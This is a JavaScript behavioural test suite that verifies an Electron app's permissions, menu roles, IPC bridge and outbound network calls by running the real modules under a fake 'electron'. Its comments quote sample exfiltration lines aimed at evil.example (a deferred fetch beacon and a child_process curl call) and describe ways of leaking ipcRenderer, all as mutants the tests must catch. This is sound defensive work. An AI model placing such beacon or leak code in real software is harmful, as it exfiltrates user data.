/**
 * BEHAVIORAL guards for the packaged Electron main/preload surface.
 *
 * WHY THIS FILE EXISTS. Three consecutive independent reviews defeated the same
 * class of check — source-text regexes over electron-main.cjs / electron-preload.cjs.
 * Every time the PRODUCT was correct and the CHECK was wrong; every time the fix
 * was a sharper regex, and the next review beat it with a new spelling:
 *
 *   review 1  `getRaw: () => ipcRenderer` as the final member, no trailing comma
 *   review 2  `send: () => ipcRenderer.send`            (returns the raw sender)
 *   review 3  `new Set(['ok', ...EXTRA_PERMISSIONS])`   (spread hides an entry)
 *             `const { openExternal } = shell`          (destructured alias)
 *             `ipcRenderer.send('ok', v), ipcRenderer.send('secret', v)` (comma)
 *             `const raw = ipcRenderer; raw: () => raw` (alias, no text match)
 *
 * A regex asks how the code is SPELLED, and there are unboundedly many spellings.
 * These checks ask what the code DOES: `src/desktop/electron-behavior-runner.cjs`
 * loads the real modules under a fake `electron`, captures the real handlers,
 * invokes them, and judges by IDENTITY and recorded effect. Every evasion above
 * dies at once, because none of them changes behaviour — that is the point.
 *
 * The regex contracts remain as fast early warnings; THESE are the guard of
 * record.
 *
 * MUTATION-TESTED — each of these, applied to the tree, fails this file:
 *   M1  add any permission to ALLOWED_PERMISSIONS, however spelled (literal,
 *       spread, .add() afterwards)                        -> permissions fails
 *   M2  expose ipcRenderer, any of its methods, or an alias of either, by any
 *       syntax                                            -> bridge fails
 *   M3  add any outbound call to any host but the update origin -> egress fails
 *   M4  reach shell.openExternal with a non-https URL, by any door or alias
 *                                                          -> openexternal fails
 *
 *   node src/integration/electron-behavior.test.mjs
 */
import { execFileSync } from 'node:child_process';
import { readFileSync, rmSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import assert from 'node:assert';
import { randomUUID } from 'node:crypto';

const repo = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const RUNNER = join(repo, 'src', 'desktop', 'electron-behavior-runner.cjs');
// Canary values the runner plants in each reported array so a FABRICATED one
// cannot pass; kept in sync with the same names in the runner.
const CANARY_URL = 'https://runner-canary.invalid/reporting-path';
const CANARY_TIMER_MS = 987654;
// The global-read canaries carry a per-run NONCE: a constant name can simply be
// typed into the runner (`preloadGlobalReads: [CANARY_GLOBAL, ...]` survived
// every other check in this section), and a name chosen here at run time cannot.
const NONCE = randomUUID().slice(0, 8);
const CANARY_GLOBAL = `__runnerCanaryGlobalRead_${NONCE}`;
const CANARY_GLOBAL_UNDEF = `__runnerCanaryGlobalUndef_${NONCE}`;

let checks = 0;
function ok(cond, msg) { checks++; assert(cond, msg); }

function run(mode, env = {}) {
  let stdout;
  try {
    stdout = execFileSync('node', [RUNNER, repo, mode], {
      encoding: 'utf8', timeout: 60000, env: { ...process.env, NODE_ENV: 'test', RUNNER_CANARY_NONCE: NONCE, ...env },
    });
  } catch (e) {
    // A crashed runner must never read as a pass. This is not hypothetical: an
    // `await import('node:tls')` egress mutant killed the run with an unhandled
    // ENOTFOUND before any result was printed, so the failure arrived as a raw
    // stack trace instead of naming the invariant it broke.
    const detail = `${e.stdout ?? ''}${e.stderr ?? ''}`.trim().split('\n').slice(-6).join('\n');
    assert.fail(`runner (${mode}) exited ${e.status ?? 'abnormally'} instead of reporting. An `
      + 'unhandled error in the main process is itself a finding — commonly an outbound call the '
      + `interception layer could not stub. Last output:\n${detail}`);
  }
  // The result comes back via a FILE: the payload outgrew the pipe buffer once,
  // and a truncated JSON line fails as "Unexpected end of JSON input" — a
  // harness failure wearing none of the vocabulary of the assertion it hides.
  const line = stdout.split('\n').find((l) => l.startsWith('RUNNER_RESULT_FILE '));
  assert(line, `runner (${mode}) printed no RUNNER_RESULT_FILE:\n${stdout.slice(-2000)}`);
  const file = line.slice('RUNNER_RESULT_FILE '.length).trim();
  const raw = readFileSync(file, 'utf8');
  rmSync(file, { force: true });
  let result;
  try { result = JSON.parse(raw); } catch (e) {
    assert.fail(`runner (${mode}) wrote unparseable output (${e.message}). First 500 chars:\n`
      + raw.slice(0, 500));
  }
  assert(!result.error, `runner (${mode}) could not measure anything: ${result.error}`);
  return result;
}

// ─────────────────────────────────────────────────────────────────────────────
// 1. PERMISSIONS — drive the real handler with every permission name.
// ─────────────────────────────────────────────────────────────────────────────
const perms = run('permissions');
ok(perms.requestHandlerInstalled,
  'session.setPermissionRequestHandler must be installed. Without it Electron GRANTS every '
  + 'permission a renderer asks for, and this renderer displays model-generated content.');
ok(perms.checkHandlerInstalled,
  'session.setPermissionCheckHandler must be installed: the request handler covers prompts, the '
  + 'check handler covers synchronous capability queries. Both doors or neither.');
// FOUND BY MY OWN SELF-REVIEW, the same defect as the bridge mode's. This
// section used to run synchronously after the app loaded, so anything the app
// did on a LATER TICK was invisible. Both of these survived until the wait:
//   setTimeout(() => ses.setPermissionRequestHandler((_w,p,cb) => cb(true)), 5)
//     — the last handler installed wins, so the allowlist measured here was
//     simply replaced a tick later;
//   setTimeout(() => Menu.setApplicationMenu(null), 5)
//     — the audited menu swapped for Electron's default, devtools roles and all.
ok(perms.deferredMs >= 100,
  `CONTROL: the runner must wait (waited ${perms.deferredMs}ms) before reading, or every check in `
  + 'this section measures only what the app did synchronously and a one-line deferral hides the '
  + 'rest.');

ok(perms.deviceHandlerInstalled,
  'session.setDevicePermissionHandler must be installed — HID/serial/USB device selection is a '
  + 'separate door from the permission handlers.');
// The whole point of this file: a COUNT over the real answers, not a reading of
// the source. How the allowlist is spelled cannot change this result.
ok(perms.probed >= 20,
  `the probe must cover the documented permission surface (probed ${perms.probed}); a short list `
  + 'would leave real capabilities untested.');

// SR-53. The probe list was hand-written and had drifted off the product: it
// carried 'background-sync' and 'unknown-permission', neither of which the
// installed Electron can ever send, and OMITTED 'unknown' — the real name
// Electron uses for a permission it does not recognise, and therefore the one
// name a lenient allowlist is most likely to wave through. MEASURED: a handler
// reading `permission === 'unknown' || ALLOWED_PERMISSIONS.has(permission)`
// left the literal Set untouched, so electronpermissions.contract.test.ts
// passed 43/43 and this file passed with the old list. Derive the names from
// the installed electron.d.ts so the list cannot drift again.
{
  const dts = readFileSync(join(repo, 'node_modules/electron/electron.d.ts'), 'utf8');
  const electronVersion = JSON.parse(
    readFileSync(join(repo, 'node_modules/electron/package.json'), 'utf8')).version;
  const union = (method) => {
    const line = dts.split('\n').find((l) => l.includes(`${method}(handler:`));
    ok(!!line, `CONTROL: ${method}'s declaration was not found in electron.d.ts — the extraction `
      + 'below would then assert against an empty set and pass for free.');
    const m = /permission: ((?:'[^']+' \| )*'[^']+')/.exec(line || '');
    ok(!!m, `CONTROL: could not read ${method}'s permission union out of electron.d.ts.`);
    return (m ? m[1] : '').split(' | ').map((s) => s.replace(/'/g, ''));
  };
  const real = [...new Set([...union('setPermissionRequestHandler'),
    ...union('setPermissionCheckHandler')])];
  ok(real.length >= 20,
    `CONTROL: only ${real.length} permission names came out of electron.d.ts; the parse broke and `
    + 'the subset check below would be trivially satisfiable.');
  ok(real.includes('unknown'),
    'CONTROL: this Electron\'s union must contain "unknown" — that is the finding this guard is '
    + `for. Parsed: ${JSON.stringify(real)}.`);
  const missed = real.filter((p) => !perms.probedNames.includes(p));
  assert.deepStrictEqual(missed, [],
    `the permission probe never sends ${JSON.stringify(missed)}, which the installed Electron `
    + `(${electronVersion}) CAN send. A capability the probe never requests is a capability the `
    + 'allowlist is never tested against, so "granted: [clipboard-sanitized-write]" would hold '
    + 'while the app granted one of these to every caller.');
  checks++;
  const invented = perms.probedNames.filter((p) => !real.includes(p) && p !== 'not-a-real-permission');
  assert.deepStrictEqual(invented, [],
    `the probe sends ${JSON.stringify(invented)}, which this Electron never sends. Probing names `
    + 'that cannot occur inflates the count without testing anything; exactly one synthetic name '
    + '("not-a-real-permission") is kept, to prove an unknown permission is denied.');
  checks++;
  ok(perms.probedNames.includes('not-a-real-permission'),
    'CONTROL: the probe must still include one name Electron will never send, or nothing proves '
    + 'the allowlist denies by default rather than matching a fixed list of real names.');
}

assert.deepStrictEqual(perms.granted, ['clipboard-sanitized-write'],
  `exactly one permission may be granted, and it must be clipboard-sanitized-write. Granted: `
  + `${JSON.stringify(perms.granted)} out of ${perms.probed} probed. This is measured by INVOKING `
  + 'the shipped handler, so a spread, an .add() call, a computed value or any other spelling '
  + 'that widens the allowlist fails here.');
checks++;
assert.deepStrictEqual(perms.checked, ['clipboard-sanitized-write'],
  `the check handler must answer true for exactly clipboard-sanitized-write. Answered true for: `
  + `${JSON.stringify(perms.checked)}.`);
checks++;
ok(perms.deviceGranted === false,
  `the device permission handler must deny (returned ${JSON.stringify(perms.deviceGranted)}).`);

// FOUND BY THIS AGENT, sweep 2. The MENU is a capability surface and this file
// had never looked at it. A `role` is a live Electron capability, not a label:
// `toggleDevTools` opens an inspector on the production renderer whatever the
// item is called, and the `viewMenu` role expands into toggleDevTools + reload
// + forceReload on its own (RED-DESKTOP-21/001, found in the shipped app).
// Worse, Electron installs its DEFAULT menu — carrying all three — when none is
// set, so "no menu" is strictly more dangerous than a wrong one.
assert.deepStrictEqual(perms.menuRoles, ['appMenu', 'fileMenu', 'editMenu', 'resetZoom',
  'zoomIn', 'zoomOut', 'togglefullscreen', 'windowMenu'],
  `the installed menu carries roles ${JSON.stringify(perms.menuRoles)}. Roles are capabilities: `
  + 'toggleDevTools/reload/forceReload must never appear, and `viewMenu` must never appear either '
  + 'because it expands into exactly those three. Collected by walking the template the app '
  + 'actually handed to Menu.setApplicationMenu, submenus included, so nesting one deeper does '
  + 'not hide it.');
checks++;
for (const role of perms.menuRoles) {
  ok(!/^(toggle)?[dD]ev[tT]ools$|^(force)?[rR]eload$|^viewMenu$/.test(role),
    `the menu carries the role ${JSON.stringify(role)} — a live inspector or reload on the `
    + 'production renderer. devTools:false on the window kills the inspector, but reload still '
    + 'restarts an SPA mid-state.');
}

// SR-60. Everything above reads the TEMPLATE the app hands to
// setApplicationMenu. Electron then EXPANDS the container roles, and nothing
// had ever looked at the result: `{ role: 'fileMenu' }` is one entry here and
// several real menu items with real capabilities in the shipped app.
//
// MEASURED against a real Electron 31.7.7 (ad-hoc signed copy of the dev
// binary — the unsigned one is SIGKILLed on this machine), building this
// app's exact template: 43 items, and 24 roles appear that the app never
// wrote (about, close, copy, cut, delete, front, hide, hideOthers, minimize,
// paste, pasteAndMatchStyle, quit, redo, selectAll, services,
// showSubstitutions, start/stopSpeaking, toggleSmartDashes/Quotes,
// toggleTextReplacement, undo, unhide, zoom). NONE is an inspector, a reload,
// or a devtools item, so the template-level assertion above is sound TODAY.
//
// Why it is sound, exactly: of every container role Electron offers, only
// `viewMenu` expands into reload/forceReload/toggleDevTools — measured one
// role at a time (viewMenu -> those three; shareMenu, windowMenu, appMenu,
// fileMenu, editMenu, help -> none). `viewMenu` is denylisted by name above.
//
// That is a property of Electron, not of this app, so pin the assumption
// rather than the finding: if an upgrade ever moves a devtools item into a
// container role this template DOES use, the list below is what has to be
// re-measured, and this check names it.
// SR-62 (this agent, sweep 19). The block below compared against a HAND-WRITTEN
// list of four role names. That pins the APP's side of the assumption but not
// ELECTRON's — and the dangerous half of the claim is about Electron: "of every
// container role Electron offers, only viewMenu expands to devtools/reload". A
// literal cannot notice Electron GAINING a container role. It already had six,
// not four: `shareMenu` is declared by the installed Electron and was named in
// neither the list nor the note above, and an upgrade adding a seventh would
// leave this reading clean while the measurement behind it went stale.
//
// So derive the UNIVERSE from the installed electron.d.ts — the same technique
// the permission block above uses, for the same reason — and require every
// declared container role to be either measured-safe or denylisted. Never
// neither.
//
// RE-MEASURED this sweep, one role at a time, on an ad-hoc-signed Electron
// 31.7.7 whose version was checked against the .app's OWN Electron Framework
// Info.plist (both CFBundleVersion 31.7.7), walking each built menu recursively
// (_gen/b22-s19-menu-expansion.mjs):
//   appMenu 10 items, fileMenu 2, editMenu 20, windowMenu 5, shareMenu 1 —
//   ZERO devtools/reload/inspect items between them
//   viewMenu 10 items -> reload, forceReload, toggleDevTools. That is the
//   POSITIVE CONTROL of the measurement: it proves the detector fires at all,
//   and it is denylisted by the loop above.
{
  const dts = readFileSync(join(repo, 'node_modules/electron/electron.d.ts'), 'utf8');
  const roleLine = dts.split('\n').find((l) => /role\?:/.test(l) && /appMenu/.test(l) && /viewMenu/.test(l));
  ok(!!roleLine, 'CONTROL: the MenuItem role union was not found in electron.d.ts — the derivation '
    + 'below would assert against an empty universe and pass for free.');
  const declaredContainers = [...new Set((roleLine || '').match(/'[a-zA-Z]+Menu'/g) || [])]
    .map((s) => s.replace(/'/g, ''));
  ok(declaredContainers.length >= 5,
    `CONTROL: only ${declaredContainers.length} container roles parsed out of electron.d.ts `
    + `(${JSON.stringify(declaredContainers)}); the parse broke.`);
  ok(declaredContainers.includes('shareMenu'),
    'CONTROL: this Electron declares shareMenu — the role the old hand-written list of four '
    + `omitted, which is the finding this block is for. Parsed: ${JSON.stringify(declaredContainers)}.`);

  // Measured safe THIS SWEEP, each expanded on the pinned Electron.
  const MEASURED_SAFE = ['appMenu', 'fileMenu', 'editMenu', 'windowMenu', 'shareMenu'];
  // Measured DANGEROUS, and denylisted by name in the loop above.
  const MEASURED_DANGEROUS = ['viewMenu'];
  const unaccounted = declaredContainers
    .filter((r) => !MEASURED_SAFE.includes(r) && !MEASURED_DANGEROUS.includes(r));
  assert.deepStrictEqual(unaccounted, [],
    `the installed Electron declares container role(s) ${JSON.stringify(unaccounted)} that have `
    + 'never been expanded and measured. Electron EXPANDS a container role into real menu items '
    + 'with real capabilities, and every check above reads only the TEMPLATE, so a new container '
    + 'role carrying a devtools or reload item would be invisible here. Expand it on the pinned '
    + 'Electron (_gen/b22-s19-menu-expansion.mjs), then add it to MEASURED_SAFE, or to '
    + 'MEASURED_DANGEROUS *and* to the denylist regex above.');
  checks++;

  // And the app's own template may only use roles from the measured-safe set.
  const usedContainers = [...new Set(perms.menuRoles.filter((r) => declaredContainers.includes(r)))];
  const usedButNotSafe = usedContainers.filter((r) => !MEASURED_SAFE.includes(r));
  assert.deepStrictEqual(usedButNotSafe, [],
    `the shipped template uses container role(s) ${JSON.stringify(usedButNotSafe)} that are not in `
    + `the measured-safe set ${JSON.stringify(MEASURED_SAFE)}. Only viewMenu is known to expand into `
    + 'reload/forceReload/toggleDevTools, so using it — or any unmeasured container — puts a live '
    + 'inspector or an SPA-destroying reload in the shipped menu bar.');
  checks++;
  ok(usedContainers.length >= 4,
    `CONTROL: only ${usedContainers.length} container roles were seen in the installed template `
    + `(${JSON.stringify(usedContainers)}). Both checks above are satisfied trivially by an EMPTY `
    + 'template, which is exactly what Menu.setApplicationMenu(null) produces — the door the '
    + 'shipped inspector came through in the first place.');
  checks++;
}
ok(perms.menuSetToNull === false,
  'Menu.setApplicationMenu(null) was called. That does not mean "no menu": Electron then installs '
  + 'its DEFAULT application menu, whose View submenu carries live toggleDevTools, reload and '
  + 'forceReload roles. Passing null is how the shipped inspector got there in the first place.');
ok(perms.menusInstalledCount === 1,
  `setApplicationMenu was called ${perms.menusInstalledCount} times. The last call wins, so a `
  + 'second one silently replaces the audited template with whatever it carries.');

// FOUND BY THIS AGENT, sweep 2. A webview, a popup or a devtools child arrives
// LATER, via `web-contents-created`, and carries its own session. If that path
// stops hardening, the policy covers only the first window — and every count
// above still reads correct, because every one of them measures that window.
ok(perms.lateHardened === true,
  'a webContents created later (webview, popup, devtools child) was NOT given the permission '
  + 'policy. `web-contents-created` is the only door for contents this app did not construct '
  + 'itself, and a session created later starts unpoliced without it.');
assert.deepStrictEqual(perms.lateGranted, ['clipboard-sanitized-write'],
  `a late webContents was granted ${JSON.stringify(perms.lateGranted)} — it must get exactly the `
  + 'same allowlist as the main window, not a wider one and not none at all.');
checks++;
ok(perms.lateNavigationGated === true,
  'a late webContents did not get both navigation handlers. An iframe or popup navigating away is '
  + 'the same capability as the main window doing it.');

// Chromium reads its command line during startup, so these switches ARE the
// browser's configuration. `disable-background-networking` is the measured
// primary guard keeping the renderer off Google's networks (39/40 idle
// snapshots non-loopback before it, 7/40 after). And a `remote-debugging-port`
// appended here would open the whole renderer to any local process — a door
// that bypasses contextIsolation, the permission policy and the bridge at once.
assert.deepStrictEqual(perms.commandLineSwitches, ['disable-background-networking'],
  `the app appended ${JSON.stringify(perms.commandLineSwitches)} to Chromium's command line. `
  + "Exactly one switch is expected. A new one is a change to the browser's security "
  + 'configuration made outside every API this file otherwise checks — remote-debugging-port, '
  + 'disable-web-security and ignore-certificate-errors all live here.');
checks++;
ok(perms.singleInstanceLockRequested === true,
  'app.requestSingleInstanceLock() was never called. Without it a second launch is a second '
  + 'process writing the same db.json, and the desktop lock in server.ts is left as the only thing '
  + 'standing between the user and two writers on one database.');

// FOUND BY THIS AGENT, sweep 2 (not by a reviewer). getDisplayMedia is granted
// through setDisplayMediaRequestHandler, NOT through the permission handler —
// installing one and calling back with a stream hands over the screen while
// `granted: ['clipboard-sanitized-write']` above stays perfectly clean.
//
// The deeper shape: the product feature-detects (`typeof ses.X === 'function'`)
// before installing several handlers, so a fake that LACKS a method makes the
// product silently skip it and the guard reads clean on a door it never
// measured. The fake now carries every capability API by name.
ok(perms.displayMediaGrant === null,
  `the display-media handler handed back ${JSON.stringify(perms.displayMediaGrant)}. Anything but `
  + 'null is a screen/window/tab capture granted to a renderer that displays model-generated '
  + 'content — and it does NOT show up in the permission-handler results above, because '
  + 'getDisplayMedia consults this handler instead.');
assert.deepStrictEqual(perms.handlerCensus, {
  setPermissionRequestHandler: 1,
  setPermissionCheckHandler: 1,
  setDevicePermissionHandler: 1,
  setDisplayMediaRequestHandler: 0,
  setBluetoothPairingHandler: 0,
  setUSBProtectedClassesHandler: 0,
  setCertificateVerifyProc: 0,
  setProxy: 0,
  allowNTLMCredentialsForDomains: 0,
}, `the set of session capability doors the app installs on has changed: `
  + `${JSON.stringify(perms.handlerCensus)}. Exactly three may be used, and each of the zeros is a `
  + 'capability grant with its own channel: display-media hands over the screen, the Bluetooth '
  + 'pairing handler completes a device pairing, setCertificateVerifyProc can accept a bad TLS '
  + 'certificate, and setProxy can route every request through a third party. A new non-zero here '
  + 'is a new grant, whether or not the permission results above changed.');
checks++;
// The fake's own completeness control: the product touched only properties the
// fake carries. A read of something absent would mean a feature-detect fell
// through and the product's real behaviour was never exercised.
for (const prop of perms.sessionReads) {
  ok(prop === '__nashPermissionPolicy' || prop in { ...perms.handlerCensus, webRequest: 0, setSpellCheckerEnabled: 0 },
    `SELF-TEST: the app read session.${prop}, which the fake does not carry. If that read is a `
    + '`typeof ses.' + prop + ' === "function"` feature-detect, the product SKIPPED whatever it '
    + 'guards and this run measured a door that was never opened. Add it to the fake.');
}

// ─────────────────────────────────────────────────────────────────────────────
// 2. BRIDGE — identity, not text. Nothing exposed may BE a live IPC handle.
// ─────────────────────────────────────────────────────────────────────────────
const bridge = run('bridge');
// FOUND BY THIS AGENT, sweep 2. The runner kept only the LAST exposure, so a
// second `exposeInMainWorld('nashInternal', {raw: ipcRenderer})` overwrote
// itself out of the measurement while still reaching the renderer. And
// `exposeInIsolatedWorld` is a separate API with the same effect. Every
// exposure is judged now, in every world.
assert.deepStrictEqual(bridge.allExposures.map((e) => `${e.world}:${e.key}`), ['main:nashDesktop'],
  `the preload made these exposures: ${JSON.stringify(bridge.allExposures)}. Exactly one is `
  + 'allowed, in the main world, named nashDesktop. A second call is a second namespace handed to '
  + 'the renderer whatever it is named, and exposeInIsolatedWorld reaches any script in that world.');
checks++;
for (const e of bridge.allExposures) {
  ok(e.leaks === false,
    `the exposure ${e.world}:${e.key} contains a live ipcRenderer handle (keys `
    + `${JSON.stringify(e.keys)}).`);
}
// A preload runs with `window` as its global: a plain assignment reaches the
// page with no contextBridge involved and no isolation to cross.
assert.deepStrictEqual(bridge.globalsAdded, [],
  `the preload added globals ${JSON.stringify(bridge.globalsAdded)}. A preload's global object IS `
  + 'the page\'s window, so `globalThis.x = ipcRenderer` hands the renderer a live handle without '
  + 'touching contextBridge — contextIsolation does not stop an assignment made inside the preload.');
checks++;
ok(bridge.globalLeaks.length === 0,
  `preload globals ${JSON.stringify(bridge.globalLeaks)} hold a live IPC handle.`);

// FOUND BY MY OWN SELF-REVIEW. The runner reported SYNCHRONOUSLY after loading
// the preload, so anything the preload deferred —
//   queueMicrotask(() => exposeInMainWorld('nashLate', { raw: ipcRenderer }))
// — reached the renderer after this process had already said "exactly one
// exposure" and exited. A preload is not finished when its top level is.
ok(bridge.drained === true,
  'CONTROL: the runner must drain the microtask and timer queues before reading. Without it every '
  + 'exposure check above measures only what the preload did synchronously, and deferring one line '
  + 'is enough to hand the renderer a live IPC handle invisibly.');
ok(bridge.lateExposures === 0,
  `the preload made ${bridge.lateExposures} exposure(s) AFTER its top level finished. Deferring an `
  + 'exposure does not make it safer — it lands in the same renderer — and is the shape that '
  + 'escapes any harness reading synchronously.');

// THE PRELOAD MUST ARM NOTHING. Every check above reads state at a moment;
// work scheduled for after that moment is invisible to all of them, and the
// bridge child exits as soon as the preload finishes evaluating. The 9router
// reviewer landed exactly that: one line added to electron-preload.cjs,
//   setTimeout(() => fetch('https://evil.example/collect'), 100)
// ran with all 430 checks green. Raising the wait only moves the goalpost;
// what is ARMED is the question no wait can dodge.
//
// Zero, not a threshold: measured across the preload's require alone (not the
// process lifetime — electron-main.cjs loads afterwards in this same child and
// arms its own two), and a preload that needs no timer today has no honest
// reason to grow one. If it ever does, this fails loudly and the exemption is
// written down here deliberately.
//
// This counts timers ARMED, and deliberately ignores cancellation, where the
// main-process census (pendingTimers) subtracts cleared ones. The difference
// is not an oversight: electron-main legitimately arms and clears a slow-boot
// fallback, so counting arms there would fire on correct code, while the
// preload's honest answer is zero timers at all — so "armed then cancelled"
// is already a change worth failing on, and leaving it exempt would make
// clearTimeout a place to park a beacon. Verified both ways.
// The DELAYS the preload armed, with the runner's canary still among them, so
// the expected value is exactly [987654]. A count was the first spelling and
// it was too weak: `preloadTimers: 1` — a fabricated number that happens to
// know about the canary — hid a live 100ms beacon. A list cannot do that; it
// would have to drop the canary or carry the beacon.
assert.deepStrictEqual(bridge.preloadTimers, [CANARY_TIMER_MS],
  `electron-preload.cjs armed ${JSON.stringify(bridge.preloadTimers)} (the runner's own `
  + `${CANARY_TIMER_MS}ms canary should be the only entry; its absence means the list was `
  + 'fabricated rather than measured). A preload runs inside the renderer with bridge access, so '
  + 'deferred work there is the cheapest possible beacon: every other check in this file reads '
  + 'state before it would fire. Nothing in the preload needs a timer.');
checks++;

// …and the other half of the same question. The timer census answers "what is
// still going to run?"; it says nothing about what ALREADY ran. They are not
// the same: `queueMicrotask(() => fetch(...))` and
// `Promise.resolve().then(() => fetch(...))` both defer past every synchronous
// read in the bridge mode WITHOUT arming a timer, and both were verified to
// actually fire before the child exits — they survived the timer check.
//
// So the outbound globals are now instrumented from the runner's first line,
// before the preload is required. The preload is an offline math tool's bridge
// to one IPC channel; it has no reason to dial anything, at any time, by any
// route. The 60ms drain outlasts any microtask queue, so a deferred call has
// been recorded by the time this reads.
// The runner plants a canary in each reported array (see its self-test block)
// so a HARDCODED empty array cannot pass: it would arrive without the canary.
// Asserted first, then subtracted, so the real verdict below is unaffected.
ok(bridge.preloadNetworkCalls.some(([, u]) => u === CANARY_URL),
  'the runner\'s network canary did not survive the trip to this test, so preloadNetworkCalls is '
  + 'not the array the recorder wrote — hardcoding it to [] passes every check below for free.');
ok((bridge.pendingTimers || []).includes(CANARY_TIMER_MS),
  'the runner\'s timer canary did not survive the trip to this test, so pendingTimers is not the '
  + 'census — hardcoding it to [] passes the armed-timer checks for free.');
const preloadCalls = bridge.preloadNetworkCalls.filter(([, u]) => u !== CANARY_URL);

assert.deepStrictEqual(preloadCalls, [],
  `electron-preload.cjs made outbound call(s) ${JSON.stringify(preloadCalls)}. The `
  + 'preload runs in the renderer with bridge access; anything it dials carries whatever it can '
  + 'reach. The packaged app must talk to loopback and nothing else.');
checks++;

// CONTROL: the harness must OFFER every outbound door before "no calls" means
// anything. A preload runs in a renderer, where XMLHttpRequest and
// navigator.sendBeacon exist; under plain Node they are undefined, so those
// two mutants threw into their own catch and the suite passed without ever
// measuring them — absence in the fake reading exactly like correctness in the
// product, which is this harness's oldest trap. The runner reports which doors
// it installed; if one disappears, this fails instead of going quiet.
// The canary door exists only during the probe, so a fabricated list cannot
// contain it — hardcoding the four names passed this check for free.
ok(bridge.outboundDoors.includes('__runnerCanaryDoor'),
  `outboundDoors came back as ${JSON.stringify(bridge.outboundDoors)}, without the canary door the `
  + 'runner installs for the probe. That list was not probed, so it describes nothing.');
assert.deepStrictEqual(bridge.outboundDoors.filter((d) => d !== '__runnerCanaryDoor').sort(),
  ['XMLHttpRequest', 'WebSocket', 'fetch', 'sendBeacon', 'EventSource', 'Image',
    'RTCPeerConnection'].sort(),
  `the bridge runner offered the preload ${JSON.stringify(bridge.outboundDoors)}. A door it does `
  + 'not provide is a door the preload cannot be caught using: the call throws, a beacon\'s '
  + 'try/catch swallows it, and the empty preloadNetworkCalls above means nothing.');
checks++;

// POSITIVE CONTROL: the recorders must actually record.
//
// Every preload verdict above is "the list came back empty", which is also
// exactly what a broken recorder produces. Four separate ways of breaking one
// left all 433 checks green: deleting the `networkCalls.push` line, hardcoding
// `preloadNetworkCalls: []`, hardcoding `pendingTimers: []`, and returning a
// fabricated `outboundDoors` list. The egress mode does have a positive
// control, but it covers a DIFFERENT fetch — the update-reply stub installed
// hundreds of lines further down — so it could not see any of them.
//
// The runner drives each door with a known URL before loading the preload and
// reports whether the call landed, then rolls the arrays back.
// EVERY GLOBAL THE PRELOAD READS. Zero, and that is not a coincidence.
//
// Stubbing renderer doors one at a time is a race I cannot win. EventSource,
// Image and RTCPeerConnection were added last round; the very next probe found
// SEVEN more that are real in a renderer and `undefined` under Node —
// navigator.serviceWorker.register, WebTransport,
// document.createElement('script').src, link[rel=prefetch], form.submit,
// window.open, navigator.geolocation. All seven passed for the same reason:
// the mutant threw into its own catch, so nothing was measured and the suite
// reported success. Enumerating doors will always be one probe behind.
//
// So census what the preload TOUCHES rather than what it might touch. The real
// file is ten lines — `require('electron')`, one exposeInMainWorld, one
// ipcRenderer.send — and reads no global at all. A door nobody has named yet
// fails exactly like the ones above.
//
// Asserted as the canary ALONE, not as []. The runner reads one canary global
// inside the measured window, so the list is never legitimately empty: a
// hardcoded `preloadGlobalReads: []` — which is what a broken or disabled
// census also produces — now fails for missing the canary, and a census that
// never installed its traps fails the same way. Subtracting it here means the
// control and the measurement are the same list, so they cannot disagree.
assert.deepStrictEqual(bridge.preloadGlobalReads, [CANARY_GLOBAL, CANARY_GLOBAL_UNDEF].sort(),
  `electron-preload.cjs read global(s) ${JSON.stringify(
    (bridge.preloadGlobalReads || []).filter(
      (g) => g !== CANARY_GLOBAL && g !== CANARY_GLOBAL_UNDEF))}, and BOTH census canaries `
  + `(${CANARY_GLOBAL}, ${CANARY_GLOBAL_UNDEF} \u2014 one per census mechanism) must be present. It bridges one IPC channel and needs no global: each one `
  + 'here is a renderer capability (document, navigator, WebTransport, localStorage …) and '
  + 'reaching for one is the first half of using it. A missing canary means the census itself is '
  + 'not running. If the preload legitimately grows a need, add it here deliberately.');
checks++;

// WHAT THE PRELOAD REQUIRES — exactly 'electron', nothing else.
//
// The outbound-door checks above cover renderer APIs. They cannot see
// `require('child_process').exec('curl https://evil.example')`, which is a
// different and worse door: child_process is REAL under Node, so unlike
// EventSource or Image the call actually runs, and it escapes every network
// stub by spawning a process. It passed all 437 checks — the runner's
// Module._load hook saw the require and discarded it, because only
// electron-main.cjs's requires were being recorded.
//
// A preload that bridges one IPC channel needs one module. Anything else —
// child_process, fs, net, http, an npm package — is a capability the renderer
// side should not be acquiring, so the list is exact rather than a denylist of
// module names I happened to think of.
// The preload's own entry path is the canary here: Module._load sees it first,
// so a real list always carries it and a hardcoded ['electron'] does not.
ok(bridge.preloadRequires.some((m) => m.endsWith('electron-preload.cjs')),
  `preloadRequires came back as ${JSON.stringify(bridge.preloadRequires)}, without the preload's `
  + 'own entry path that Module._load always sees first. That list was fabricated, not recorded.');
assert.deepStrictEqual(
  bridge.preloadRequires.filter((m) => !m.endsWith('electron-preload.cjs')),
  ['electron'],
  `electron-preload.cjs required ${JSON.stringify(bridge.preloadRequires)}. It bridges one IPC `
  + 'channel and needs exactly one module; anything else is a capability acquired inside the '
  + 'renderer\'s own process, and child_process in particular escapes every network stub in this '
  + 'file by spawning a process.');
checks++;

// WHAT THIS DOES NOT COVER, stated rather than left to be discovered. The
// canaries defeat a runner field that was hardcoded to its expected EMPTY
// value — the realistic way these rot, since every verdict here is "the list
// came back empty". They do not defeat an edit that fabricates a field while
// KNOWING the canary (`preloadTimers: [987654]`), which was measured to still
// hide a timer-only beacon. That attacker is editing the guard itself, which
// is a code-review problem and not one a self-test inside the same file can
// solve; chasing it further would only move the same knowledge one level up.
assert.deepStrictEqual(bridge.recorderSelfTest,
  { fetch: true, XMLHttpRequest: true, sendBeacon: true, EventSource: true, Image: true,
    RTCPeerConnection: true, timerCensus: true },
  `the bridge runner's own recorders failed their self-test `
  + `(${JSON.stringify(bridge.recorderSelfTest)}). A recorder that does not record makes every `
  + '"the preload dialled nothing" verdict above vacuous — they would all still pass on a preload '
  + 'that beaconed on every door.');
checks++;

ok(bridge.exposedKey === 'nashDesktop',
  `the preload must expose exactly one namespace, "nashDesktop" (got ${JSON.stringify(bridge.exposedKey)}).`);
assert.deepStrictEqual(bridge.keys, ['setBackgroundColor'],
  `the bridge must expose exactly ['setBackgroundColor'] (got ${JSON.stringify(bridge.keys)}). Every `
  + 'additional member is a new capability handed to a renderer that renders model output.');
checks++;
// The leak detector's own self-test. Without this, a walker that silently
// stopped finding things would turn every "no leak" verdict below into a
// free pass — which is how a nested `return { raw: ipcRenderer }` survived
// the first version of this file.
